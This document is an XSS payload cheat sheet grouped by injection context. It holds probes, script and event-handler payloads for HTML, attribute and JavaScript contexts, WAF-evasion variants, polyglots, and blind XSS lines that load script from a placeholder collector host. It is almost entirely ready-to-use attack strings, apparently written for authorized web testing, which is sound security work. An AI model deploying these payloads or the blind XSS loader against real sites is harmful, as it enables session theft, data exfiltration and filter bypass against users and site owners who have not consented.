# XSS Payload Reference

Grouped by injection context. PROBE marks detection strings; EXPLOIT marks
impact payloads. Replace alert(1) with your authorized marker.

## Detection probes (context fingerprinting)

```text
'';!--"<XSS>=&{()}
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//
<svg/onload=alert(1)>
"><svg/onload=alert(1)>//
```

## HTML body context

```html
<script>alert(1)</script>
<ScRiPt>alert(1)</sCrIpT>
<script >alert(1)</script >
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
<object data="javascript:alert(1)">
<form><button formaction=javascript:alert(1)>X
<math><mtext><table><mglyph><style><!--</style><img title="--></mglyph><img src=1 onerror=alert(1)>">
```

## Attribute context

```html
" onfocus=alert(1) autofocus "
' onmouseover=alert(1) x='
" onerror=alert(1) src=x "
javascript:alert(1)      <!-- href/src context -->
data:text/html,<script>alert(1)</script>
```
Break out then close cleanly so page still renders: `x" onerror=alert(1) y="`

## JavaScript string context

```js
";alert(1)//
';alert(1)//
</script><script>alert(1)</script>        // if inside <script> block
\";alert(1)//                              // when quotes are escaped
\u003c/script\u003e                        // unicode escape contexts
```

## WAF-evasion flavored (post-block only)

```html
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<video><source onerror="javascript:alert(1)">
<math><mi// xlink:href=data:x,<script>alert(1)</script>>
<a href="jav&#x0D;ascript:alert(1)">X</a>
<isindex type=image src=1 onerror=alert(1)>
<script src=data:text/javascript,alert(1)></script>   <!-- if data: allowed -->
```

## Polyglot (one-shot multi-context)

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//
</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

## Blind XSS bootstrap

```html
<script src=https://YOUR.COLLECTOR.HOST/xss></script>
"><script src=https://YOUR.COLLECTOR.HOST/xss></script>
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+src=https://YOUR.COLLECTOR.HOST/xss+'>
```
